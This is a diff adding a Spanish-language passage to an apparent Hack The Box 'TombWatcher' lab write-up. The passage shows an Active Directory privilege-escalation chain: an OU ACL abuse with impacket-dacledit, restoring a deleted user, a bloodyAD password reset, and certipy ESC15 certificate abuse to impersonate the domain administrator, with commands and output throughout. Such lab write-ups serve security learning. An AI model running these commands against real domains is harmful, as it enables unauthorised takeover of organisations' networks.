@@ -297,6 +297,124 @@ en bloodhound tambien podemos ver
 
 Con el control total de la unidad organizativa (OU), puede agregar una nueva ACE que heredará hasta los objetos bajo ella. La forma más sencilla y directa de abusar del control de la unidad organizativa (OU) es aplicarle una ACE GenericAll que herede todos los tipos de objeto. Esto se puede hacer usando dacledit de Impacket 
 
+```bash
+impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'Darksblack10.'
+```
+
+<img width="1920" height="173" alt="image" src="https://github.com/user-attachments/assets/3bfff607-6808-48be-9107-1541fc5740df" />
+
+ahora desde la instancia de `evil-winrm` podemos conseguir un usuario el cual fue eliminado
+
+```powershell
+Get-ADObject -Filter {isDeleted -eq $true -and ObjectClass -eq 'user'} -IncludeDeletedObjects -Properties *
+```
+
+<img width="1920" height="965" alt="image" src="https://github.com/user-attachments/assets/63f09e14-68eb-402e-8a49-156fca909172" />
+
+Restauramos el usuario `cert_admin`
+
+```powershell
+Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
+```
+>>> Activamos el usuario a traves del ObjectGUID 938182c3-bf0b-410a-9aaa-45c8e1a02ebf ya que es el que resulta tener los privilegios necesarios para
+>>> poder explotar el certificado (Los demas ObjectGUID al testearlos no tenian los privilegios adecuados)
+
+y verificamos
+
+```powershell
+Get-ADUser -Identity "cert_admin" -Properties *
+```
+
+<img width="1920" height="1007" alt="image" src="https://github.com/user-attachments/assets/8a6a9a79-6016-474a-82e5-8627a1db17cc" />
+
+volvemos a recopilar informacion con `bloodhound-python`
+
+```bash
+bloodhound-python -u 'john' -p 'Darksblack10.' -d tombwatcher.htb -ns 10.10.11.72 -c ALl --zip
+```
+
+<img width="1920" height="471" alt="image" src="https://github.com/user-attachments/assets/61863385-4e61-4bd3-8a0a-72c5f9e292b4" />
+
+exportamos a bloodhound
+
+<img width="1920" height="1012" alt="image" src="https://github.com/user-attachments/assets/c692be60-59aa-4d75-8978-775e5aab9781" />
+
+y vemos que tenemos privilegios sobre el usuario que restauramos, asi que vamos a cambiar su password
+
+```bash
+bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb'  -u 'john' -p 'Darksblack10.' set password 'cert_admin' 'Darksblack100'
+```
+
+una vez cambiada la password vamos a chequear que certificados pueden ser vulnerables
+
+```bash
+certipy-ad find -u cert_admin -p "Darksblack100" -dc-ip 10.10.11.72
+```
+```bash
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 13 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
+[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
+[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
+[*] Saving text output to '20250809233550_Certipy.txt'
+[*] Wrote text output to '20250809233550_Certipy.txt'
+[*] Saving JSON output to '20250809233550_Certipy.json'
+[*] Wrote JSON output to '20250809233550_Certipy.json'
+```
+```bash
+cat 20250809233550_Certipy.txt
+```
+
+<img width="1920" height="1012" alt="image" src="https://github.com/user-attachments/assets/4fefdbb6-9ef0-4dbe-b75e-879acbb776a5" />
+
+conseguimos un posible vector de ataque, Principales problemas de seguridad en este `Template`
+
+1. `EnrolleeSuppliesSubject: True` permite que el usuario que solicita el certificado defina el nombre del sujeto y los SANs
+2. `Requires Manager Approval: False` Los certificados se emiten automáticamente sin revisión
+3. Permisos de inscripción amplios
+4. Resulta ser vulnerable a ESC15
+
+Ahora para explotar una plantilla vulnerable a `ESC15` lo hacemos asi:
+
+```bash
+certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Darksblack100' -dc-ip '10.10.11.72' -target 'tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'
+```
+>>> Con este comando de Certipy-ad estamos solicitando un certificado de ADCS con la finalidad de suplantar al administrador del dominio (administrator@tombwatcher.htb) para autenticación en Kerberos/NTLM.
+
+<img width="1920" height="277" alt="image" src="https://github.com/user-attachments/assets/0036a662-93e8-43fc-ad80-a67013210282" />
+
+
+Ya con el certificado `administrator.pfx` vamos autenticarnos para cambiar la password de administrator
+
+```bash
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
+```
+
+<img width="1920" height="821" alt="image" src="https://github.com/user-attachments/assets/e172adb8-38c5-4147-b22e-d8dfc946e97b" />
+
+ahora solo tenemos que autenticarnos via `WinRrm`
+
+```bash
+evil-winrm -i DC01.tombwatcher.htb -u Administrator -p 'Darksblack1234'
+```
+
+<img width="1920" height="959" alt="image" src="https://github.com/user-attachments/assets/c2390a48-0de0-4aee-8cb2-98fda51a42ea" />
+
+>>> Conseguimos acceso como administrador del sistema!!!!!!!
+
+
+
 
 
 
